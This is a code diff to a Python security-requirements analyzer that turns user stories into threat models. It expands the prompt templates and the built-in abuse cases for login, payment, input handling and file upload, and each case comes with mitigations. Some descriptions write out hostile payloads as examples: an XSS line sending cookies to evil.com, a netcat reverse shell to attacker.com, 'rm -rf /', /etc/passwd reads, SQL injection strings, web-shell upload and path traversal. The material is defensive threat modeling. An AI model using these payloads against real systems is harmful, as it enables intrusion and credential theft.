@@ -28,45 +28,81 @@ class SecurityRequirementsAnalyzer:
     """Analyzes user stories to generate security requirements using AI"""
 
     # Default prompt instructions that can be customized via settings
-    DEFAULT_ABUSE_CASE_PROMPT = """Generate 5-7 detailed abuse cases. For EACH abuse case provide:
+    DEFAULT_ABUSE_CASE_PROMPT = """Generate 5-7 highly detailed abuse cases. For EACH abuse case provide:
 
-1. **Threat Title**: Clear, specific attack name
-2. **Threat Actor**: Who performs this attack (e.g., External Attacker, Malicious Insider, Automated Bot)
-3. **Detailed Attack Description** (MUST be 5-10 lines with bullet points):
-   • Step-by-step attack methodology
-   • Specific tools used (Burp Suite, SQLMap, Metasploit, Hydra, etc.)
-   • Attack vectors and entry points
-   • Data or assets targeted
-   • Potential damage and business impact
-4. **Impact Level**: Critical/High/Medium/Low with justification
-5. **Likelihood**: High/Medium/Low
-6. **STRIDE Category**: Spoofing/Tampering/Repudiation/Information Disclosure/Denial of Service/Elevation of Privilege
-7. **Mitigations** (provide 4-5 specific mitigations):
-   • Each mitigation must include specific implementation details
-   • Reference security controls, libraries, or frameworks
-   • Include verification/testing approach"""
+1. **Threat Title**: Specific attack name (e.g., "SQL Injection via Search Parameter", "Session Hijacking through XSS")
+2. **Threat Actor**: External Attacker / Malicious Insider / Automated Bot / Competitor / Nation-State Actor
+3. **Attack Prerequisites**:
+   • Required knowledge or access level
+   • Tools and resources needed
+   • Time and effort estimation
+4. **Detailed Attack Scenario** (MUST be 8-12 lines):
+   • RECONNAISSANCE: How attacker discovers the vulnerability (port scanning, directory enumeration, source code review)
+   • WEAPONIZATION: Tools prepared (Burp Suite, SQLMap, Metasploit, Hydra, custom scripts)
+   • DELIVERY: Attack vector used (malicious URL, crafted input, uploaded file, API call)
+   • EXPLOITATION: Step-by-step technical execution with example payloads
+   • INSTALLATION: Persistence mechanisms if applicable
+   • COMMAND & CONTROL: Data exfiltration methods
+   • ACTIONS ON OBJECTIVES: Final impact (data theft, privilege escalation, system compromise)
+5. **Technical Details**:
+   • Example attack payloads or commands
+   • Vulnerable code patterns exploited
+   • Network protocols or APIs abused
+6. **Impact Assessment**:
+   • Confidentiality impact (data exposed)
+   • Integrity impact (data modified)
+   • Availability impact (service disruption)
+   • Financial impact estimation
+   • Regulatory/compliance implications
+7. **Likelihood Factors**: High/Medium/Low with justification based on attack complexity and attacker motivation
+8. **STRIDE Category**: Spoofing/Tampering/Repudiation/Information Disclosure/Denial of Service/Elevation of Privilege
+9. **Detailed Mitigations** (provide 5-6 specific mitigations):
+   • Preventive controls with implementation details
+   • Detective controls (monitoring, alerting)
+   • Corrective controls (incident response)
+   • Specific libraries/frameworks (e.g., OWASP ESAPI, helmet.js, bcrypt)
+   • Configuration examples
+   • Verification through security testing (SAST, DAST, penetration test)"""
 
-    DEFAULT_SECURITY_REQ_PROMPT = """Generate 8-10 detailed security requirements. For EACH requirement provide:
+    DEFAULT_SECURITY_REQ_PROMPT = """Generate 8-10 highly detailed security requirements. For EACH requirement provide:
 
 1. **Requirement ID**: Unique identifier (SR-001, SR-002, etc.)
-2. **Requirement Title**: Clear, actionable security control
-3. **Priority**: Critical/High/Medium/Low
-4. **Category**: Authentication/Authorization/Input Validation/Cryptography/Logging/Rate Limiting/API Security/Data Protection
-5. **Detailed Rationale** (MUST be 5-8 lines):
-   • Why this requirement is necessary
-   • What threats it mitigates
-   • CWE reference (e.g., CWE-89, CWE-79)
-   • OWASP reference (e.g., OWASP Top 10 A01:2021)
-   • Compliance mapping (PCI-DSS, GDPR, etc.)
-   • Business impact if not implemented
-6. **Implementation Details**:
-   • Specific libraries/frameworks to use (bcrypt, argon2, helmet.js, etc.)
-   • Code patterns or configurations
-   • Integration points
-7. **Acceptance Criteria** (MUST be 3-5 specific, testable criteria):
-   • Each criterion must be measurable and verifiable
-   • Include specific test scenarios
-   • Define pass/fail conditions"""
+2. **Requirement Title**: Clear, actionable security control statement
+3. **Priority**: Critical/High/Medium/Low (based on risk and exploitability)
+4. **Category**: Authentication/Authorization/Input Validation/Cryptography/Logging/Rate Limiting/API Security/Data Protection/Session Management/Error Handling
+5. **Detailed Description** (MUST be 6-10 lines):
+   • Comprehensive explanation of the security control
+   • Technical implementation approach
+   • Integration with existing security architecture
+   • Dependencies and prerequisites
+6. **Threat Context**:
+   • Specific threats this requirement mitigates
+   • Attack scenarios prevented
+   • Historical breach examples (if applicable)
+7. **Compliance & Standards Mapping**:
+   • CWE references (e.g., CWE-89 SQL Injection, CWE-79 XSS)
+   • OWASP Top 10 2021 mapping (e.g., A03:2021 Injection)
+   • OWASP ASVS control references
+   • PCI-DSS requirements (if applicable)
+   • GDPR/CCPA articles (if applicable)
+   • NIST CSF controls
+8. **Implementation Guidance**:
+   • Recommended libraries/frameworks (bcrypt, argon2, helmet.js, OWASP ESAPI)
+   • Code patterns and examples
+   • Configuration settings
+   • Architecture considerations
+   • Performance implications
+9. **Acceptance Criteria** (MUST be 4-6 specific, testable criteria):
+   • Functional test cases with expected outcomes
+   • Security test scenarios (positive and negative)
+   • Performance benchmarks
+   • Automated test integration (unit, integration, security)
+   • Manual verification steps
+10. **Verification Methods**:
+    • SAST tool checks
+    • DAST scanning approach
+    • Manual code review checklist
+    • Penetration testing scope"""
 
     STRIDE_CATEGORIES = [
         {"id": "S", "name": "Spoofing", "description": "Pretending to be something or someone else"},
@@ -387,32 +423,90 @@ Return ONLY valid JSON with proper escaping."""
             patterns.append({
                 "abuse_cases": [
                     {
-                        "title": "Brute Force Attack",
-                        "description": "An attacker attempts multiple password combinations to gain unauthorized access",
-                        "threat_actor": "External Attacker",
-                        "impact": "high",
-                        "likelihood": "high"
+                        "title": "Brute Force Password Attack",
+                        "description": "• RECONNAISSANCE: Attacker identifies login endpoint through directory enumeration and observes authentication flow\n• WEAPONIZATION: Prepares wordlists from common passwords, leaked databases, and generates variations using tools like Hashcat rules\n• DELIVERY: Uses automated tools (Hydra, Burp Intruder, custom Python scripts) to submit rapid login attempts\n• EXPLOITATION: Bypasses weak rate limiting by rotating IP addresses through proxy chains or botnets\n• TECHNICAL DETAILS: POST /api/auth/login with username/password combinations at 100+ requests/second\n• IMPACT: Unauthorized account access leading to data theft, identity fraud, or lateral movement within the system\n• BUSINESS IMPACT: Customer data breach, regulatory fines (GDPR up to 4% revenue), reputation damage",
+                        "threat_actor": "External Attacker / Automated Bot",
+                        "impact": "Critical",
+                        "likelihood": "High",
+                        "stride_category": "Spoofing",
+                        "mitigations": [
+                            "Implement progressive rate limiting: 5 attempts/minute, 20 attempts/hour per IP and username combination",
+                            "Deploy CAPTCHA (reCAPTCHA v3 or hCaptcha) after 3 failed attempts",
+                            "Implement account lockout with exponential backoff (15min, 1hr, 24hr)",
+                            "Use bcrypt or Argon2id for password hashing with cost factor >= 12",
+                            "Monitor and alert on authentication anomalies using SIEM integration",
+                            "Require MFA for all accounts, especially privileged users"
+                        ]
                     },
                     {
-                        "title": "Credential Stuffing",
-                        "description": "Attacker uses leaked credentials from other breaches to access accounts",
-                        "threat_actor": "External Attacker",
-                        "impact": "high",
-                        "likelihood": "medium"
+                        "title": "Credential Stuffing Attack",
+                        "description": "• RECONNAISSANCE: Attacker obtains leaked credential databases from dark web marketplaces or previous breaches\n• WEAPONIZATION: Cross-references emails with target application's user base using OSINT techniques\n• DELIVERY: Uses credential stuffing tools (Sentry MBA, OpenBullet, custom scripts) with proxy rotation\n• EXPLOITATION: Exploits password reuse across multiple services - studies show 65% of users reuse passwords\n• TECHNICAL DETAILS: Automated login attempts using username:password pairs from breaches like Collection #1-5\n• IMPACT: Mass account takeover affecting potentially thousands of users\n• BUSINESS IMPACT: Customer trust erosion, class action lawsuits, mandatory breach notifications",
+                        "threat_actor": "External Attacker / Organized Crime",
+                        "impact": "Critical",
+                        "likelihood": "High",
+                        "stride_category": "Spoofing",
+                        "mitigations": [
+                            "Integrate with HaveIBeenPwned API to check passwords against known breaches",
+                            "Implement device fingerprinting and behavioral analysis for anomaly detection",
+                            "Require email/SMS verification for logins from new devices or locations",
+                            "Deploy Web Application Firewall (WAF) with bot detection capabilities",
+                            "Implement login velocity checks across the entire platform",
+                            "Force password reset for accounts detected in breach databases"
+                        ]
+                    },
+                    {
+                        "title": "Session Hijacking via Token Theft",
+                        "description": "• RECONNAISSANCE: Attacker analyzes session management mechanism through traffic interception\n• WEAPONIZATION: Sets up network sniffing on shared WiFi or compromises client machine\n• DELIVERY: Intercepts session tokens via XSS, network sniffing, or malware on victim's device\n• EXPLOITATION: Replays stolen session token to impersonate legitimate user without credentials\n• TECHNICAL DETAILS: Stealing JWT from localStorage/sessionStorage via XSS, or session cookie via network MITM\n• IMPACT: Complete account takeover with full access to user's data and permissions\n• BUSINESS IMPACT: Unauthorized transactions, data exfiltration, compliance violations",
+                        "threat_actor": "External Attacker / Malicious Insider",
+                        "impact": "High",
+                        "likelihood": "Medium",
+                        "stride_category": "Spoofing",
+                        "mitigations": [
+                            "Store tokens in httpOnly, secure, sameSite=strict cookies instead of localStorage",
+                            "Implement short-lived access tokens (15 min) with refresh token rotation",
+                            "Bind session to client fingerprint (IP, User-Agent hash) with re-authentication on change",
+                            "Implement token revocation on password change or security events",
+                            "Use TLS 1.3 for all communications with HSTS preload",
+                            "Monitor for concurrent sessions from different geographic locations"
+                        ]
                     }
                 ],
                 "stride_threats": {
-                    "S": [{"threat": "Attacker spoofs legitimate user identity", "mitigation": "Implement MFA"}],
-                    "I": [{"threat": "Password exposed in transit or logs", "mitigation": "Use HTTPS, never log credentials"}],
-                    "E": [{"threat": "Privilege escalation via authentication bypass", "mitigation": "Implement proper session management"}]
+                    "S": [{"threat": "Attacker spoofs legitimate user identity through credential theft or session hijacking", "mitigation": "Implement MFA, device binding, and behavioral analysis"}],
+                    "I": [{"threat": "Password or session token exposed in transit, logs, or client-side storage", "mitigation": "Use HTTPS only, never log credentials, use httpOnly cookies"}],
+                    "E": [{"threat": "Privilege escalation via authentication bypass or role manipulation", "mitigation": "Implement proper RBAC with server-side validation, principle of least privilege"}]
                 },
                 "requirements": [
-                    {"category": "Authentication", "requirement": "Implement rate limiting on authentication endpoints", "priority": "must"},
-                    {"category": "Authentication", "requirement": "Enforce strong password policy (min 12 chars, complexity)", "priority": "must"},
-                    {"category": "Authentication", "requirement": "Implement account lockout after failed attempts", "priority": "must"},
-                    {"category": "Logging", "requirement": "Log all authentication attempts with timestamp and IP", "priority": "should"}
+                    {
+                        "category": "Authentication",
+                        "requirement": "Implement adaptive rate limiting on all authentication endpoints",
+                        "priority": "Critical",
+                        "rationale": "• Prevents brute force and credential stuffing attacks that can compromise user accounts\n• Mitigates CWE-307 (Improper Restriction of Excessive Authentication Attempts)\n• Required by OWASP ASVS V2.2.1 and PCI-DSS Requirement 8.1.6\n• Without this control, attackers can attempt millions of password combinations",
+                        "acceptance_criteria": "• Rate limit of 5 failed attempts per minute per IP/username enforced\n• Exponential backoff implemented after threshold exceeded\n• Automated tests verify rate limiting blocks excessive attempts\n• Monitoring alerts configured for rate limit triggers"
+                    },
+                    {
+                        "category": "Authentication",
+                        "requirement": "Enforce cryptographically secure password storage using Argon2id",
+                        "priority": "Critical",
+                        "rationale": "• Protects passwords even if database is compromised\n• Argon2id is the winner of Password Hashing Competition, resistant to GPU/ASIC attacks\n• Mitigates CWE-916 (Use of Password Hash With Insufficient Computational Effort)\n• Required by OWASP ASVS V2.4.1 and NIST SP 800-63B",
+                        "acceptance_criteria": "• All passwords hashed with Argon2id (memory=64MB, iterations=3, parallelism=4)\n• No plaintext or weakly hashed passwords in database\n• Password hash timing is constant regardless of input\n• Unit tests verify hash generation and verification"
+                    },
+                    {
+                        "category": "Authentication",
+                        "requirement": "Implement account lockout with secure recovery mechanism",
+                        "priority": "High",
+                        "rationale": "• Stops brute force attacks by locking accounts after failed attempts\n• Mitigates CWE-307 and reduces attack surface\n• Balance security with usability through progressive lockout\n• OWASP ASVS V2.2.1 compliance requirement",
+                        "acceptance_criteria": "• Account locked after 5 consecutive failed attempts\n• Lockout duration increases exponentially (15min, 1hr, 24hr)\n• Secure unlock via email verification or admin intervention\n• Lockout events logged with IP, timestamp, username"
+                    },
+                    {
+                        "category": "Logging",
+                        "requirement": "Comprehensive authentication event logging with SIEM integration",
+                        "priority": "High",
+                        "rationale": "• Enables detection of brute force, credential stuffing, and account takeover attempts\n• Required for incident response and forensic analysis\n• PCI-DSS Requirement 10.2 mandates logging of authentication events\n• GDPR Article 33 requires breach detection capabilities",
+                        "acceptance_criteria": "• All auth events logged: success, failure, lockout, unlock, password change\n• Logs include timestamp, IP, user-agent, username, result, failure reason\n• Logs forwarded to SIEM with alerting rules configured\n• Log retention minimum 1 year, tamper-evident storage"
+                    }
                 ],
-                "risk_factor": {"factor": "Authentication", "score": 20, "description": "Feature involves user authentication"}
+                "risk_factor": {"factor": "Authentication", "score": 25, "description": "Feature involves user authentication - primary target for attackers"}
             })
 
         # Payment/Financial patterns
@@ -421,24 +515,90 @@ Return ONLY valid JSON with proper escaping."""
             patterns.append({
                 "abuse_cases": [
                     {
-                        "title": "Payment Fraud",
-                        "description": "Attacker uses stolen payment credentials for unauthorized purchases",
-                        "threat_actor": "External Attacker",
-                        "impact": "high",
-                        "likelihood": "medium"
+                        "title": "Payment Card Data Theft via Formjacking",
+                        "description": "• RECONNAISSANCE: Attacker identifies payment form endpoints and JavaScript dependencies\n• WEAPONIZATION: Creates malicious JavaScript payload that captures card data on form submission\n• DELIVERY: Compromises third-party JavaScript library or injects script via XSS vulnerability\n• EXPLOITATION: Malicious script silently exfiltrates card numbers, CVV, expiry to attacker's server\n• TECHNICAL DETAILS: JavaScript keylogger on input fields: document.querySelector('#card-number').addEventListener('input', exfil)\n• REAL-WORLD EXAMPLE: British Airways breach (2018) - 380,000 cards stolen via formjacking\n• IMPACT: Mass payment card theft, PCI-DSS non-compliance, mandatory breach notification\n• BUSINESS IMPACT: Fines up to $500K per incident, card brand penalties, customer lawsuits",
+                        "threat_actor": "External Attacker / Organized Crime (Magecart groups)",
+                        "impact": "Critical",
+                        "likelihood": "Medium",
+                        "stride_category": "Information Disclosure",
+                        "mitigations": [
+                            "Implement Content Security Policy (CSP) with strict script-src directives",
+                            "Use Subresource Integrity (SRI) for all third-party JavaScript",
+                            "Host payment forms on isolated subdomain with minimal JavaScript",
+                            "Implement real-time JavaScript integrity monitoring",
+                            "Use payment tokenization (Stripe Elements, Braintree Hosted Fields) to avoid handling raw card data",
+                            "Regular security scanning of all JavaScript dependencies"
+                        ]
+                    },
+                    {
+                        "title": "Transaction Amount Manipulation",
+                        "description": "• RECONNAISSANCE: Attacker analyzes checkout flow using browser DevTools and proxy interception\n• WEAPONIZATION: Identifies client-side price calculations or hidden form fields with amounts\n• DELIVERY: Uses Burp Suite to intercept and modify POST request with payment details\n• EXPLOITATION: Changes price from $100.00 to $1.00 in request body before server processes\n• TECHNICAL DETAILS: Modify JSON payload: {'item_id': '123', 'price': 1.00, 'quantity': 1}\n• IMPACT: Financial loss from products sold below cost, inventory discrepancies\n• BUSINESS IMPACT: Direct revenue loss, potential for large-scale fraud if automated",
+                        "threat_actor": "External Attacker / Opportunistic Fraudster",
+                        "impact": "High",
+                        "likelihood": "High",
+                        "stride_category": "Tampering",
+                        "mitigations": [
+                            "Never trust client-side price calculations - always calculate amounts server-side from product catalog",
+                            "Sign cart contents with HMAC to detect tampering",
+                            "Implement server-side validation comparing submitted price against database price",
+                            "Log all price discrepancies for fraud investigation",
+                            "Use transaction signing for high-value purchases",
+                            "Implement velocity checks for unusual purchasing patterns"
+                        ]
+                    },
+                    {
+                        "title": "Card Testing Fraud (Carding Attack)",
+                        "description": "• RECONNAISSANCE: Attacker obtains lists of potentially valid card numbers from dark web\n• WEAPONIZATION: Sets up automated scripts to test card validity via small transactions\n• DELIVERY: Submits hundreds of $1 transactions to verify which cards are active\n• EXPLOITATION: Validated cards sold on dark web or used for larger fraudulent purchases\n• TECHNICAL DETAILS: Automated POST to /checkout with rotating card numbers, checking for success response\n• IMPACT: High chargeback rates, payment processor penalties, account termination\n• BUSINESS IMPACT: Chargeback fees ($15-100 per incident), processor relationship damage",
+                        "threat_actor": "External Attacker / Automated Bot",
+                        "impact": "High",
+                        "likelihood": "High",
+                        "stride_category": "Tampering",
+                        "mitigations": [
+                            "Implement CAPTCHA on payment forms after first failed attempt",
+                            "Use 3D Secure 2.0 for all card-not-present transactions",
+                            "Implement velocity limits: max 3 card attempts per session/IP",
+                            "Deploy fraud detection ML models (Stripe Radar, Signifyd)",
+                            "Block known proxy/VPN IP ranges on payment endpoints",
+                            "Require AVS (Address Verification) and CVV match"
+                        ]
                     }
                 ],
                 "stride_threats": {
-                    "T": [{"threat": "Transaction amount manipulation", "mitigation": "Server-side validation of all amounts"}],
-                    "R": [{"threat": "User denies making transaction", "mitigation": "Implement transaction logging and receipts"}],
-                    "I": [{"threat": "Payment data exposure", "mitigation": "Use tokenization, never store full card numbers"}]
+                    "T": [{"threat": "Transaction amount manipulation via request tampering", "mitigation": "Server-side price calculation with cryptographic cart signing"}],
+                    "R": [{"threat": "User disputes legitimate transaction (friendly fraud)", "mitigation": "Comprehensive transaction logging with device fingerprint and IP"}],
+                    "I": [{"threat": "Payment card data exposure via formjacking or database breach", "mitigation": "Use payment tokenization, never store full PAN, implement CSP"}]
                 },
                 "requirements": [
-                    {"category": "Data Protection", "requirement": "Never store full credit card numbers (PCI-DSS compliance)", "priority": "must"},
-                    {"category": "Input Validation", "requirement": "Validate all transaction amounts server-side", "priority": "must"},
-                    {"category": "Logging", "requirement": "Maintain audit trail for all financial transactions", "priority": "must"}
+                    {
+                        "category": "Data Protection",
+                        "requirement": "Implement PCI-DSS compliant payment card handling using tokenization",
+                        "priority": "Critical",
+                        "rationale": "• PCI-DSS mandates protection of cardholder data (Requirement 3)\n• Storing full card numbers exposes business to massive liability\n• Tokenization removes PCI scope from application servers\n• Breach of card data results in fines up to $500K and brand damage\n• CWE-311 (Missing Encryption of Sensitive Data)",
+                        "acceptance_criteria": "• No full card numbers stored in application database\n• Payment processor tokenization (Stripe, Braintree) implemented\n• PCI SAQ-A or SAQ-A-EP compliance achieved\n• Quarterly ASV scans show no card data exposure"
+                    },
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Server-side validation of all transaction amounts with cryptographic integrity",
+                        "priority": "Critical",
+                        "rationale": "• Prevents price manipulation attacks that cause direct financial loss\n• Client-side prices can be trivially modified via browser tools\n• CWE-20 (Improper Input Validation)\n• OWASP ASVS V5.1.3 requires server-side validation",
+                        "acceptance_criteria": "• All prices retrieved from server-side product catalog at checkout\n• Cart contents signed with HMAC, validated before payment processing\n• Price discrepancies logged and flagged for review\n• Automated tests verify price manipulation attempts are rejected"
+                    },
+                    {
+                        "category": "Logging",
+                        "requirement": "Comprehensive financial transaction audit trail with tamper-evident storage",
+                        "priority": "Critical",
+                        "rationale": "• Required for fraud investigation and chargeback disputes\n• PCI-DSS Requirement 10 mandates transaction logging\n• SOX compliance requires financial audit trails\n• Essential for forensic analysis in breach scenarios",
+                        "acceptance_criteria": "• All transactions logged: amount, timestamp, user, IP, device fingerprint, result\n• Logs stored in append-only, tamper-evident storage\n• Retention minimum 7 years for financial compliance\n• Real-time alerting on suspicious transaction patterns"
+                    },
+                    {
+                        "category": "Rate Limiting",
+                        "requirement": "Implement anti-carding controls with velocity limits and bot detection",
+                        "priority": "High",
+                        "rationale": "• Prevents card testing fraud that leads to high chargebacks\n• Payment processors may terminate accounts with >1% chargeback rate\n• Automated carding attempts are easily detectable with proper controls\n• CWE-799 (Improper Control of Interaction Frequency)",
+                        "acceptance_criteria": "• Maximum 3 failed card attempts per session before CAPTCHA required\n• IP-based velocity limits: 10 transactions per hour\n• Bot detection integrated (reCAPTCHA Enterprise, DataDome)\n• Fraud scoring integrated with payment processor"
+                    }
                 ],
-                "risk_factor": {"factor": "Financial Data", "score": 25, "description": "Feature handles financial transactions"}
+                "risk_factor": {"factor": "Financial Data", "score": 30, "description": "Feature handles payment card data - highest risk category"}
             })
 
         # Data input patterns
@@ -447,23 +607,90 @@ Return ONLY valid JSON with proper escaping."""
             patterns.append({
                 "abuse_cases": [
                     {
-                        "title": "Injection Attack",
-                        "description": "Attacker injects malicious code through user input fields",
+                        "title": "SQL Injection Attack",
+                        "description": "• RECONNAISSANCE: Attacker probes input fields with single quotes and SQL syntax to identify vulnerable parameters\n• WEAPONIZATION: Crafts SQL injection payloads using SQLMap or manual techniques\n• DELIVERY: Submits malicious input via search box, login form, or URL parameters\n• EXPLOITATION: Executes arbitrary SQL: ' OR '1'='1' -- or UNION SELECT for data extraction\n• TECHNICAL DETAILS: Input: admin'-- in username field bypasses authentication; UNION SELECT password FROM users extracts credentials\n• DATA EXFILTRATION: Uses blind SQL injection techniques (time-based, boolean-based) to extract data character by character\n• IMPACT: Complete database compromise - read, modify, delete any data; potential for OS command execution via xp_cmdshell\n• BUSINESS IMPACT: Data breach affecting all customers, GDPR fines up to €20M, class action lawsuits",
                         "threat_actor": "External Attacker",
-                        "impact": "high",
-                        "likelihood": "high"
+                        "impact": "Critical",
+                        "likelihood": "High",
+                        "stride_category": "Tampering",
+                        "mitigations": [
+                            "Use parameterized queries/prepared statements exclusively - NEVER concatenate user input into SQL",
+                            "Implement ORM (SQLAlchemy, Hibernate, Entity Framework) with parameterized queries",
+                            "Apply input validation with whitelist approach - reject unexpected characters",
+                            "Use database accounts with minimal privileges (no DROP, no xp_cmdshell)",
+                            "Deploy WAF rules for SQL injection patterns",
+                            "Regular SAST scanning with tools like Semgrep, SonarQube for SQL injection vulnerabilities"
+                        ]
+                    },
+                    {
+                        "title": "Cross-Site Scripting (XSS) Attack",
+                        "description": "• RECONNAISSANCE: Attacker identifies input fields that reflect content back to users without encoding\n• WEAPONIZATION: Creates malicious JavaScript payloads for cookie theft or session hijacking\n• DELIVERY: Injects script via comment field, profile name, or URL parameter\n• EXPLOITATION: Stored XSS: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n• TECHNICAL DETAILS: Reflected XSS via search: /search?q=<script>alert(1)</script>; DOM XSS via innerHTML\n• SESSION HIJACKING: Steals session cookies, JWT tokens from localStorage, or performs actions as victim\n• IMPACT: Account takeover, data theft, malware distribution, defacement\n• BUSINESS IMPACT: Customer trust erosion, compliance violations, potential for worm-like spreading",
+                        "threat_actor": "External Attacker",
+                        "impact": "High",
+                        "likelihood": "High",
+                        "stride_category": "Information Disclosure",
+                        "mitigations": [
+                            "Implement context-aware output encoding (HTML, JavaScript, URL, CSS contexts)",
+                            "Use templating engines with auto-escaping (React, Angular, Jinja2 with autoescape)",
+                            "Deploy Content Security Policy (CSP) with strict script-src directive",
+                            "Set httpOnly flag on session cookies to prevent JavaScript access",
+                            "Use DOMPurify for sanitizing any user-generated HTML content",
+                            "Implement X-XSS-Protection and X-Content-Type-Options headers"
+                        ]
+                    },
+                    {
+                        "title": "Command Injection Attack",
+                        "description": "• RECONNAISSANCE: Attacker identifies functionality that may execute system commands (file operations, ping, etc.)\n• WEAPONIZATION: Crafts payloads to break out of intended command and execute arbitrary commands\n• DELIVERY: Injects shell metacharacters via input field: filename; rm -rf / or filename | nc attacker.com 4444 -e /bin/sh\n• EXPLOITATION: Achieves remote code execution on server, installs backdoor or exfiltrates data\n• TECHNICAL DETAILS: If code uses os.system('ping ' + user_input), attacker sends: 8.8.8.8; cat /etc/passwd\n• IMPACT: Complete server compromise, lateral movement, data exfiltration, ransomware deployment\n• BUSINESS IMPACT: Total system breach, regulatory fines, business continuity impact",
+                        "threat_actor": "External Attacker",
+                        "impact": "Critical",
+                        "likelihood": "Medium",
+                        "stride_category": "Elevation of Privilege",
+                        "mitigations": [
+                            "NEVER pass user input to system commands - use language-native libraries instead",
+                            "If system commands unavoidable, use allowlist validation and parameterized execution",
+                            "Run application with minimal OS privileges (non-root, restricted shell)",
+                            "Implement sandboxing (containers, seccomp) to limit command execution scope",
+                            "Use subprocess with shell=False in Python, avoid Runtime.exec() with string concatenation in Java",
+                            "Deploy RASP (Runtime Application Self-Protection) for command injection detection"
+                        ]
                     }
                 ],
                 "stride_threats": {
-                    "T": [{"threat": "SQL/NoSQL injection to modify data", "mitigation": "Use parameterized queries"}],
-                    "I": [{"threat": "Data extraction via injection", "mitigation": "Input validation and sanitization"}]
+                    "T": [{"threat": "SQL/NoSQL injection allowing data modification or deletion", "mitigation": "Parameterized queries, input validation, least privilege DB accounts"}],
+                    "I": [{"threat": "Data extraction via injection attacks or XSS", "mitigation": "Output encoding, CSP, parameterized queries"}],
+                    "E": [{"threat": "Command injection leading to server compromise", "mitigation": "Avoid system commands, use native libraries, sandboxing"}]
                 },
                 "requirements": [
-                    {"category": "Input Validation", "requirement": "Validate and sanitize all user inputs", "priority": "must"},
-                    {"category": "Input Validation", "requirement": "Use parameterized queries for database operations", "priority": "must"},
-                    {"category": "Input Validation", "requirement": "Implement input length limits", "priority": "should"}
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Implement comprehensive input validation with whitelist approach",
+                        "priority": "Critical",
+                        "rationale": "• First line of defense against injection attacks (SQL, XSS, Command)\n• CWE-20 (Improper Input Validation) is root cause of most vulnerabilities\n• OWASP ASVS V5.1 requires input validation\n• Whitelist validation is more secure than blacklist (blocklist bypass techniques exist)",
+                        "acceptance_criteria": "• All inputs validated against expected type, length, format, and range\n• Validation occurs server-side (client-side is insufficient)\n• Unexpected input rejected with generic error message\n• SAST tools report zero input validation findings"
+                    },
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Use parameterized queries exclusively for all database operations",
+                        "priority": "Critical",
+                        "rationale": "• Prevents SQL injection by separating code from data\n• CWE-89 (SQL Injection) consistently in OWASP Top 10\n• OWASP ASVS V5.3.4 mandates parameterized queries\n• ORM usage provides additional abstraction but must still use parameters",
+                        "acceptance_criteria": "• Zero string concatenation in SQL queries verified by code review\n• All database access uses ORM or prepared statements\n• SQLMap scan shows no SQL injection vulnerabilities\n• SAST rules for SQL injection show no findings"
+                    },
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Implement context-aware output encoding for XSS prevention",
+                        "priority": "Critical",
+                        "rationale": "• Prevents XSS by encoding output based on context (HTML, JS, URL, CSS)\n• CWE-79 (Cross-Site Scripting) affects millions of applications\n• OWASP ASVS V5.3.3 requires output encoding\n• Modern frameworks provide auto-escaping but developers can bypass it",
+                        "acceptance_criteria": "• All user-controlled output encoded appropriately for context\n• CSP deployed with strict script-src (no unsafe-inline)\n• DOM XSS sinks identified and protected\n• DAST scan shows no XSS vulnerabilities"
+                    },
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Implement input length and complexity limits",
+                        "priority": "High",
+                        "rationale": "• Prevents buffer overflow, ReDoS, and resource exhaustion attacks\n• CWE-400 (Resource Exhaustion) via oversized inputs\n• Limits attack surface for injection attempts\n• OWASP ASVS V5.1.3 requires length validation",
+                        "acceptance_criteria": "• Maximum length defined for all input fields\n• Regex patterns validated for catastrophic backtracking\n• Large inputs rejected before processing\n• Load tests verify no DoS via large inputs"
+                    }
                 ],
-                "risk_factor": {"factor": "User Input", "score": 15, "description": "Feature accepts user input"}
+                "risk_factor": {"factor": "User Input", "score": 20, "description": "Feature accepts user input - primary attack vector"}
             })
 
         # File upload patterns
@@ -471,39 +698,182 @@ Return ONLY valid JSON with proper escaping."""
             patterns.append({
                 "abuse_cases": [
                     {
-                        "title": "Malicious File Upload",
-                        "description": "Attacker uploads malware or web shell disguised as legitimate file",
+                        "title": "Web Shell Upload via File Type Bypass",
+                        "description": "• RECONNAISSANCE: Attacker identifies file upload functionality and tests accepted file types\n• WEAPONIZATION: Creates PHP/JSP/ASPX web shell with disguised extension (shell.php.jpg, shell.php%00.jpg)\n• DELIVERY: Uploads malicious file exploiting weak validation (extension-only check, MIME type trust)\n• EXPLOITATION: Accesses uploaded shell via direct URL, gains remote code execution on server\n• TECHNICAL DETAILS: Upload shell.php with Content-Type: image/jpeg; access /uploads/shell.php?cmd=whoami\n• PERSISTENCE: Installs additional backdoors, creates privileged accounts, establishes C2 channel\n• IMPACT: Complete server compromise, lateral movement, data exfiltration, ransomware deployment\n• BUSINESS IMPACT: Total system breach, regulatory fines, incident response costs ($4M+ average breach cost)",
                         "threat_actor": "External Attacker",
-                        "impact": "high",
-                        "likelihood": "medium"
+                        "impact": "Critical",
+                        "likelihood": "High",
+                        "stride_category": "Elevation of Privilege",
+                        "mitigations": [
+                            "Validate file type using magic bytes (file signatures), not extension or MIME type",
+                            "Store uploads outside web root with randomized filenames",
+                            "Serve files through a handler that sets Content-Disposition: attachment",
+                            "Implement antivirus/malware scanning (ClamAV) on all uploads",
+                            "Use separate domain for user content (CDN) with no script execution",
+                            "Strip metadata and re-encode images to remove embedded code"
+                        ]
+                    },
+                    {
+                        "title": "Path Traversal via Filename Manipulation",
+                        "description": "• RECONNAISSANCE: Attacker tests filename handling by uploading files with special characters\n• WEAPONIZATION: Crafts filename with path traversal sequences: ../../../etc/passwd or ..\\..\\windows\\system32\n• DELIVERY: Uploads file with malicious filename through intercepted request\n• EXPLOITATION: File saved outside intended directory, potentially overwriting critical system files\n• TECHNICAL DETAILS: Filename: ../../../var/www/html/shell.php overwrites web application files\n• IMPACT: Arbitrary file write leading to RCE, configuration tampering, or data destruction\n• BUSINESS IMPACT: System integrity compromise, potential for complete takeover",
+                        "threat_actor": "External Attacker",
+                        "impact": "Critical",
+                        "likelihood": "Medium",
+                        "stride_category": "Tampering",
+                        "mitigations": [
+                            "Generate server-side filenames (UUID), never use client-provided filenames",
+                            "If original filename needed, sanitize by removing path separators and special characters",
+                            "Validate final path is within intended upload directory (canonical path check)",
+                            "Use chroot or containerization to limit file system access",
+                            "Set restrictive file system permissions on upload directory",
